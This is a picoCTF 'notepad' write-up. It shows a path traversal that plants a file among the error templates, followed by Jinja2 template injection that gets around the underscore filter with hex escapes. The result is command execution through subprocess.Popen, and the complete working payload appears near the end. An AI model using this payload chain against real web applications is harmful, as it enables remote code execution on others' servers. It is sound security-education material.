+++
title = "picoCTF - notepad"
tags = [
    "ctf"
]
date = "2022-03-26"
toc = true
+++

# Premise

We're given a service that will take abitrary input, and render it as an HTML page.

There are a few restrictions:
- Content cannot be longer than 512 characters
- Content cannot include `_` or `/` characters

Lastly, from the `Dockerfile` we know that the flag is going to have an arbtirary name _starting with_ `flag-`.

# Examining the tarball

This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.

At a high level, we can see that this is a Flask app (SSTI...?), and that we've got a flag, and `static` and `templates/errors` directories.

From `app.py`, we can see how some of the application logic is enforced:

```
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```

We're taking arbitrary input from the form in `index.html`, checking if it contains `_` or `/` (throw a `bad_content` error if so), then checking if it is > 512 charactersx in length (throw a `long_content` error if so.

From there, a name for the resultant file is generated using the _first 128 characters of the content_ (!!), and then an arbitrary random suffix to avoid collisions.

Lastly, the file is written out, and the user is redirected to it.

# Where do we start?

First off, since we're generating a filename using only the first 128 characters, we can use that as padding, e.g. content of `12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678foobarbaz` will give us a file name of `12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-pGVBCkNvTLY.html`. For whatever we want to include so that it won't break the URL (e.g. if we wanted to use iframes to try to retrieve other content, relative pages, etc...). This may or may not be useful, but at face value cannot be used to retrieve content outside of the `static` dir.

If we try to do something simple like creating a new file outside of the `static` subdir, we'll just get a 500 error. For example, submitting content of `..\templates\foo.html` just results in `Internal Server Error` and no file creation. Similarly, attempts at LFI outside of the scope of the `static` dir through `iframes` will 404.

The attack surface as far as I can see it at this point is to try to do something like add a new error page, or overwrite the existing error pages (this should be possible due to how the file is being opened, `w`), with content that will allow us to gain further access.

# What does traffic look like?

If we proxy traffic through Burp (or anything similar), we're just doing a basic POST with a `content` parameter:

```
POST /new HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://localhost:8000
Connection: close
Referer: http://localhost:8000/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


content=foobar
``` 

Good news is this is easy enough for us to play with in Repeater & Intruder if we wanted to, but in retrospect it won't save much time.

# Error templates

Another factor here is that looking at the error templates, these are included _based on a URL parameter_, so again, if we can create a new template, it's trivial for us to call it. 

For example, running the docker container, if we write out an arbitrary `templates/errors/foo.html` file that contains whatever we want, we can just call it from `http://localhost:8000/?error=foo`.

But how do we do this...?

The first lead is that the application is using `url_fix`, which is going to change `\` characters to `/` for us, so that part of the content filtering is irrelevant. If we try a payload of `..\templates\errors\` we get some curious behaviour... the returned URL is `http://localhost:8000/templates/errors/-AkAtr82ZpXU.html`, and if we look at the local filesystem:

```
root@bb0be7618f85:/app# ls templates/errors/
-AkAtr82ZpXU.html  bad_content.html  long_content.html
```

We have a way to create arbitrary files! We also know that we can manage the creation of the filename, and that content beyond the 128th character (but under 512) is entirely under our control.

Let's try a payload of:

```
..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678

foobarbaz
```

Predictably, this will 404, but we get a returned URL of `http://localhost:8000/templates/errors/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI.html`. Since we know this file _will_ exist on the file system, we can also now try calling it as an error since we know the filename in whole by hitting `http://localhost:8000/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI`.

Sure enough, the full content is returned in the page content!

```
 error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI
..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz
make a new note
...
```

# SSTI?

We've got the ability to create arbitrary files, with content we _largely_ control. Let's explore this further and see what vulnerabilities there are. To start, let's try a typical `{{ 7 * 7 }}` payload after our padding.

The rendered content?

```
..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 49 
```

Note that 49! Woohoo! Alright, we know we can't include `_` characters in the content, but can we encode this in a different way? Perhaps a hex `\x5f`? Yes!

```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

Sure enough, this also includes `<class 'subprocess.Popen'>` (position 273 in my case), so we're in business.

# Time for RCE!

With the hex form of `_` unfiltered, and access to `subprocess.Popen` we can use the following payload to proce out RCE:

```
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```

Pass the resulting error page filename (minus URL) into `localhost:8000/?error=<namehere>`, and we get:

```
 error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-gt_Z1Bro-iE
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 app.py flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt static templates 
```

And with one final tweak to run `cat flag*` instead of `ls`:

```
 error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-WRn7y2p0oMg
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz 
```

```
root@bb0be7618f85:/app# cat flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt 
foobarbaz
```

I'll leave you to get the flag for yourself on the live system ;)

Helpful reference:
- [Jinja2 SSTI filter bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

